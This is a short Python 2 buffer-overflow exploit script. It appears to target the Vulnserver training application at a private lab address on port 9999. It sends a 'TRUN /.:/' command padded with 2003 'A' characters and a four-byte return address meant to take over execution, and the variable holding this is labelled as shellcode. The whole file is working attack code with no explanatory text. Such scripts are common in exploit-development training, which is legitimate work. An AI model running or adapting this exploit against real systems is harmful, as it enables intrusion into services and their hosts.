#!/usr/bin/python2

import socket , sys

shellcode ="A" * 2003 + "\xaf\x11\x50\x62"


try:
 	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	s.connect(('192.168.216.130',9999))
 	s.send(('TRUN /.:/' + shellcode))
 	s.close()
 	
except:
 	print "Error connecting to server"
 	sys.exit()
